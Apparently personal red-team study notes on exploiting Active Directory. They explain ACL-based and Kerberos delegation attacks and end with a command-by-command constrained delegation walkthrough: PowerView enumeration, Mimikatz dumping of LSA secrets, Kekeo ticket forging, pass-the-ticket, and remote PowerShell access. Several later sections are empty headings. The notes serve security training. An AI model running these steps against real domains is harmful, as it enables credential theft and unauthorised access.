Having [[Breaching AD|breached]] into and [[Enumerating AD|enumerated]] an AD environment, another step that goes hand in hand with [[Lateral Movement and Pivoting|lateral movement]] is AD exploitation. Once we have performed our [[Red Recon|recon]] and understand the [[Living Off The Land|lay of the land]], we can proceed to the exploitation phase, using different misconfigurations to perform a combination of lateral movement and privilege escalation until we reach a suitable position to [[Credential Harvesting Active Directory|execute our goals]]. This phase is usually combined with [[Persistence Active Directorty|persistence]] to ensure that we can't lose the new position we gain. And of course we need to start from the enumeration step to acquire any new information that may be available from our new position.

# Permission Delegation
AD can delegate permissions and privileges through a feature called **Permission Delegation** (Not to be confused with Kerberos Delegation). One of the features that makes AD so popular, it lets users aside from those with DA credentials to carry tasks that have a certain degree of privilege by having those privileges delegated from the DA. Now of course, this has to follow the principle of Least privilege, but in large organizations that is more of a dream than a reality.

---

Permission Delegation exploits are often referred to as **ACL-based attacks**. AD allows administrators to configure **Access Control Entries** (ACEs) that populates **Discretionary Access Control Lists** (DACLs). Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that nay other AD object has against the target object.
However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. For example if the IT support team were granted the `ForceChangePassword` ACE over the Domain Users group, this would be consider insecure. This is because they would have the ability to reset the passwords of employees, but they would also be able to reset the passwords of privileged accounts, such as the accounts that are members of the Domain Admins group essentially allowing for privilege escalation.

## Exploiting ACEs
A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited. Some of the most notable ones are:
- `ForceChangePassword`: We have the ability to set the user's current password without knowing their current password.
- `AddMembers`: We have the ability to add users (including our own account), groups or computers to the target group.
- `GenericAll`: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- `GenericWrite`: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- `WriteOwner`: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- `WriteDACL`: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- `AllExtendedRights`: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the  [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) PowerShell cmdlets or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit). Depending on the breach and the detection tools in the environment, one option may be stealthier. 

Note that updating permissions, can take a while to propagate through the domain, so we won't be able to act immediately upon joining a new group or something like that.

# Kerberos Delegation
Now, when talking about AD delegation, this is usually what is being discussed, rather than Permission Delegation.
The practical use of Kerberos delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs access to a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.
However, we can allow this service to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.

## Constrained vs Unconstrained
There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method. In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the `TRUSTED_FOR_DELEGATION` flag set authenticates to a host with Unconstrained Delegation configured, a TGT for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. [Example](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976).

---


To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. Some services that can be configured for delegation are:
- HTTP - Used for Web apps to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the delegated account can't just be used for everything. However, it can still be used for some exploitation. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash, we could generate a TGT for this account, then use the TGT to execute a TGS request for any non-sensitive user account in order to access the services as that user. 

## Resource-Based Constrained Delegation
The third type of Kerberos Delegation, introduced in 2012, **Resource-Based Constrained Delegation** (RBCD) provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For a web app, for example, this means that instead of specifying that the web service account can delegate to the database service to access the database, we can now specify that on the database service that the web service account is allowed to delegate access to it.
If we have permissions configure RBCD for a service. This means we have the ability to set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for the AD object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. [Example](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/).

## Constrained Delegation Exploitation
As an example, to exploit Constrained Delegation, we first need to enumerate available delegations. We can use the `Get-NetUser` cmdlet of [[Powerview|PowerSploit]] for this enumeration by running the following:
```powershell
Import-Module PowerView.ps1
Get-NetUser -TrustedToAuth
```
Based on the output of this command, we may find an account that can delegate the HTTP and WSMAN services on a server machine. Normally we may think that this only means that we can access websites on behalf of impersonated users. However, Powershell Remoting uses the HTTP and WSMAN services as well.
We can then use [[Mimikatz]] to dump LSASecrets, part of the Windows Registry Hive where the credentials for features such as Windows services are stored. 
```mimikatz
toke::elevate
lsadump::secrets
```
This will show us the clear text credentials, which we can use to perform a Kerberos Delegation attack. For this we will use both [[Kekeo]] and [[Mimikatz]] (We can also use [[Rubeus]] to generate the tickets instead of Kekeo). We need to exit out of mimikatz so the `token::elevate` isn't active and we can load the tickets in the correct context. We will be opening Kekeo, inside the user machine and using it to generate our tickets and then use Mimikatz to load those tickets into memory.

First we need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services
```kekeo
tgt::ask /user:svcUser /domain:za.domain.com /password:Pass123
```
Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on the server.
```kekeo
tgs::s4u /tgt:TGT_svc...DOMAIN.COM.kirbi /user:t1_john.smith /service:http/server.za.domain.com
```
In here we first provide the TGT that we generated in the previous step (`/tgt`), then the user we want to impersonate (`/user`) and finally the service we want to impersonate using delegation (`/service`). We first generate a TGS for the HTTP service, then we can rerun the same for the WSMAN service.
Now that we have the two TGS tickets, we can use [[Mimikatz]] to import them.
```mimikatz
privilege::debug
kerberos::ptt TGS_t1_john.smith...COM_http~...DOMAIN.COM.kirbi
kerberos::ptt TGS_t1_john.smith...COM_wsman~...DOMAIN.COM.kirbi
```
Once done, we can exit mimikatz and run `klist` to verify if it worked. Now that the tickets are imported, we can create our PSSession on the server
```powershell
New-PSSession -ComputerName server.za.domain.com
Enter-PSSession -ComputerName server.za.domain.com
```

# Automated Relays


# AD Users


# GPOs


# Certificates


# Domain Trusts
